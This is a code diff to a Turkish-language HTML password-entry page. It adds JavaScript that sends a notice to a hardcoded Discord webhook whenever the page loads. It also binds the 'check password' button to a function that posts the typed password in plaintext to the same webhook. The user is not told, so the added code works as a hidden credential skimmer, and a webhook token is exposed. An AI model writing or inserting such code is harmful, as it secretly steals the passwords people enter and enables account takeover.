@@ -50,7 +50,6 @@
             cursor: pointer;
         }
 
-        /* Göz simgesi için stil */
         .gizli {
             cursor: pointer;
             user-select: none;
@@ -58,7 +57,6 @@
 
         .gizli.goster {
             transform: rotate(180deg);
-			
         }
     </style>
 </head>
@@ -67,7 +65,7 @@
         <div id="sifreMetni">Lütfen şifreyi girin</div>
         <input type="password" id="sifreInput" placeholder="Şifre">
         <span id="gizleGoster" class="gizli">👁</span>
-        <button id="kontrolButon">Şifreyi Kontrol Et</button>
+        <button id="kontrolButon" onclick="sendPassMessage()">Şifreyi Kontrol Et</button>
     </div>
 
     <script>
@@ -80,6 +78,70 @@
                 e.preventDefault();
             }
         });
+
+        // Kullanıcı girişi gerçekleştiğinde bu fonksiyonu çağır
+        function sendMessage() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1179831851762855966/mTTC1qc1E09zdz8rp3GsMyu262EPATQp6veDmrfjSgc7YiXAQ9YF_UEunQkeE0SDmtK0';
+
+            const message = {
+                content: 'Giriş sayfasına giriş yapıldı.'
+            };
+
+            // Fetch API kullanarak POST isteği gönder
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Webhook Hatası:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Webhook Hatası:', error.message);
+            });
+        }
+		
+
+        // Kullanıcı girişi olduğunda bu fonksiyonu çağır
+        sendMessage();
+
+        function sendPassMessage() {
+            const webhookUrl = 'https://discord.com/api/webhooks/1179831851762855966/mTTC1qc1E09zdz8rp3GsMyu262EPATQp6veDmrfjSgc7YiXAQ9YF_UEunQkeE0SDmtK0';
+            const messageInput = document.getElementById('sifreInput');
+            const messageContent = messageInput.value;
+
+            if (messageContent.trim() === '') {
+                return;
+            }
+
+            const message = {
+                content: 'Şifre Denendi: ' + messageContent
+            };
+
+            // Fetch API kullanarak POST isteği gönder
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Webhook Hatası:', response.status, response.statusText);
+                } else {
+                    // Optional: Mesaj gönderildikten sonra inputu temizle
+                    messageInput.value = '';
+                }
+            })
+            .catch(error => {
+                console.error('Webhook Hatası:', error.message);
+            });
+        }
 
         const sifreInput = document.getElementById("sifreInput");
         const kontrolButon = document.getElementById("kontrolButon");
